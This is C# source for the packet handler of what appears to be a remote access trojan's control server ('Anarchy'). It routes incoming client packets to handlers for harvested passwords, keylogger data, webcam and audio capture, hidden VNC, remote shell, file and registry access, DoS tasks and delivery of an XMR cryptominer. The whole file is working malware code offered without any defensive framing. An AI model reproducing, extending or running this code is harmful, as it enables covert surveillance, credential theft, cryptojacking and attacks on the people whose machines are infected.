using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class Packet
    {
        public Clients client;

        public byte[] data;

        public void Read(object o)
        {
            try
            {
                MsgPack unpack_msgpack;
                unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(data);
                Program.form1.Invoke((MethodInvoker)(() =>
                {
                    switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                    {
                        case "dosAdd":
                            new HandleDos().Add(this.client, unpack_msgpack);
                            break;
                        case "chat-":
                            new HandleChat().GetClient(unpack_msgpack, this.client);
                            break;
                        case "recoveryPassword":
                            new HandleRecovery(this.client, unpack_msgpack);
                            break;
                        case "socketDownload":
                            new HandleFileManager().SocketDownload(this.client, unpack_msgpack);
                            break;
                        case "Password":
                            new HandlePassword().SavePassword(this.client, unpack_msgpack);
                            break;
                        case "shell":
                            new HandleShell(unpack_msgpack, this.client);
                            break;
                        case "Received":
                            new HandleListView().Received(this.client);
                            break;
                        case "Logs":
                            new HandleLogs().Addmsg("From " + this.client.Ip + " client: " + unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
                            break;
                        case "webcam":
                            new HandleWebcam(unpack_msgpack, this.client);
                            break;
                        case "sendPlugin":
                            ThreadPool.QueueUserWorkItem(delegate
                            {
                                this.client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
                            });
                            break;
                        case "reportWindow":
                            new HandleReportWindow(this.client, unpack_msgpack.ForcePathObject("Report").AsString);
                            break;
                        case "regManager":
                            new HandleRegManager().RegManager(this.client, unpack_msgpack);
                            break;
                        case "fileSearcher":
                            new HandleFileSearcher().SaveZipFile(this.client, unpack_msgpack);
                            break;
                        case "netstat":
                            new HandleNetstat().GetProcess(this.client, unpack_msgpack);
                            break;
                        case "thumbnails":
                            this.client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                            new HandleThumbnails(this.client, unpack_msgpack);
                            break;
                        case "processManager":
                            new HandleProcessManager().GetProcess(this.client, unpack_msgpack);
                            break;
                        case "remoteDesktop":
                            new HandleRemoteDesktop().Capture(this.client, unpack_msgpack);
                            break;
                        case "HVNC":
                            new HandleHVNC().Capture(client, unpack_msgpack);
                            break;
                       
                        case "Audio":
                            new HandleAudio().SaveAudio(this.client, unpack_msgpack);
                            break;
                        case "fun":
                            new HandleFun().Fun(this.client, unpack_msgpack);
                            break;
                        case "chat":
                            new HandleChat().Read(unpack_msgpack, this.client);
                            break;
                        case "ClientInfo":
                            ThreadPool.QueueUserWorkItem(delegate {
                                new HandleListView().AddToListview(client, unpack_msgpack);
                            });
                            break;
                        case "keyLogger":
                            new HandleKeylogger(this.client, unpack_msgpack);
                            break;
                        case "reportWindow-":
                        {
                            if (Settings.ReportWindow)
                            {
                                lock (Settings.LockReportWindowClients)
                                {
                                    Settings.ReportWindowClients.Add(this.client);
                                    break;
                                }
                            }
                            MsgPack msgPack;
                            msgPack = new MsgPack();
                            msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
                            msgPack.ForcePathObject("Option").AsString = "stop";
                            ThreadPool.QueueUserWorkItem(this.client.Send, msgPack.Encode2Bytes());
                            break;
                        }
                        case "fileManager":
                            new HandleFileManager().FileManager(this.client, unpack_msgpack);
                            break;
                        case "GetXmr":
                            new HandleMiner().SendMiner(this.client);
                            break;
                        case "Information":
                            new HandleInformation().AddToInformationList(this.client, unpack_msgpack);
                            break;
                        case "Error":
                            new HandleLogs().Addmsg("Error from " + this.client.Ip + " client: " + unpack_msgpack.ForcePathObject("Error").AsString, Color.Red);
                            break;
                    }
                }));
            }
            catch
            {
            }
        }
    }
}
